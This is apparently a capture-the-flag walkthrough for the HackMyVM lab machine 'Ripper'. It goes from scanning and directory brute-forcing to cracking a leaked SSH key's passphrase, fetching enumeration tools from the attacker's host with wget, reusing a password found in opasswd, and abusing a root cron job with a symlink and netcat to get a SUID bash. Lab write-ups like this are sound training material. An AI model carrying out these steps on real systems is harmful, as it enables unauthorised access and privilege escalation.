<h1 align="center"> Webmaster-HMV: <a href="https://hackmyvm.eu/machines/machine.php?vm=Ripper">Webmaster</a></h1/>


## Net Discover & NMAP
First thinks first

 ```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ sudo netdiscover -r 10.1.1.1/24 -i eth0 

  Currently scanning: 10.1.1.0/24   |   Screen View: Unique Hosts                                                                                                                                                                            
                                                                                                                                                                                                                                            
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.1.1.1        08:00:27:12:9a:21      1      60  PCS Systemtechnik GmbH                                                                                                                                                                   
 10.1.1.27       08:00:27:54:51:58      1      60  PCS Systemtechnik GmbH  
 ```
 ```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ ip=10.1.1.27 && url=http://$ip                                                                                                                         
                                                                                  
┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ nmap -v -T5 -p- -sC -sV -oN nmap-$ip.log $ip; clear; cat nmap-$ip.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 09:21 EEST
# Nmap 7.92 scan initiated Wed Jul 13 09:21:59 2022 as: nmap -v -T5 -p- -sC -sV -oN nmap-10.1.1.27.log 10.1.1.27
Nmap scan report for 10.1.1.27
Host is up (0.00046s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
|_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 13 09:22:10 2022 -- 1 IP address (1 host up) scanned in 10.88 seconds
 ```
##Visiting the website 
```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ firefox $ip
```
Nothing special found on the website/source code etc.

##Nikto
 ```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ nikto -h $url -C all -output nikto-test.html -Format HTML 
```
Again nothing special

##Feroxbuster
 ```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $url -t 500 -o ferox-$ip.log
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.1.1.27
 🚀  Threads               │ 500
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox-10.1.1.27.log
 💲  Extensions            │ [txt, php, html, zip, htm, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        2l        8w       57c http://10.1.1.27/
200      GET        2l        8w       57c http://10.1.1.27/index.html
200      GET        2l       18w      107c http://10.1.1.27/staff_statements.txt
```
```bash
 ┌──(coolatos㉿CooLaToS)-[~~/HMV/Ripper]
└─$ curl $ip/staff_statements.txt                                                           

The site is not yet repaired. Technicians are working on it by connecting with old ssh connection files. 
```
 Old ssh ? Probably id_rsa.bak
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ curl $ip//id_rsa.bak -o id_rsa                                                                                                                                                                                                       1 ⨯
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1876  100  1876    0     0  1338k      0 --:--:-- --:--:-- --:--:-- 1832k
```
P.S the user jack can be found from the vm when you boot it.
 ```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ chmod 600 id_rsa 
┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ ssh jack@$ip -i id_rsa      
Enter passphrase for key 'id_rsa': 
```
We need that passphrase
## John time
```bash
┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ ssh2john id_rsa > hash.txt
┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ john -w /usr/share/wordlists/rockyou.txt --format=SSH 
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ john --show hash.txt     
id_rsa:bananas

1 password hash cracked, 0 left
```
 #SSH
```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/Ripper]
└─$ ssh jack@$ip -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux ripper 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jul 13 08:59:44 2022 from 10.1.1.11
jack@ripper:~$ 
 ```
 #Enumeration
 Upload linpeas and pspy64
 ```bash
 ┌──(coolatos㉿CooLaToS)-[/opt/enumeration]
└─$ python3 -m http.server 80
 jack@ripper:~$ cd /tmp && wget 10.1.1.11/linpeas.sh && wget 10.1.1.11/pspy64
jack@ripper:/tmp$ ls
linpeas.sh  pspy64 
 jack@ripper:/tmp$ chmod +x linpeas.sh 
jack@ripper:/tmp$ ./linpeas.sh
 ```
##Findings
- user: helder
- /etc/security/opasswd
```bash
jack@ripper:/tmp$ cat /etc/security/opasswd
jack:Il0V3lipt0n1c3t3a
jack@ripper:/tmp$ su jack
Password: 
jack@ripper:/tmp$ su helder
Password: 
helder@ripper:/tmp$
```
 The password is the same for both users

##First Flag
```bash
helder@ripper:~$ls
user.txt
```
##More Enumeration
 I tried again linpeas without but nothing special found
 Lets try pspy64
 ```bash
 helder@ripper:/tmp$chmod +x pspy64 && ./pspy64 
 CMD: UID=0    PID=12824  | /bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi
 ```
We can see that this is running every minute

##Exploit
 
 ```bash
 helder@ripper:/tmp$ln -s /root/.local/helder.txt /home/helder/passwd.txt
 helder@ripper:/tmp$nc -lvnp 10000 < root
listening on [any] 10000 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 41448
helder@ripper:/tmp$ls -alh /usr/bin/bash
-rwsr-sr-x 1 root root 1.2M Apr 18  2019 /usr/bin/bash
 helder@ripper:/tmp$bash -p
helder@ripper:/tmp$id
uid=1001(helder) gid=1001(helder) euid=0(root) egid=0(root) groups=0(root),1001(helder)
helder@ripper:/tmp$cd /root/
```
#Root Flag
```bash
helder@ripper:/root$ls
root.txt
```
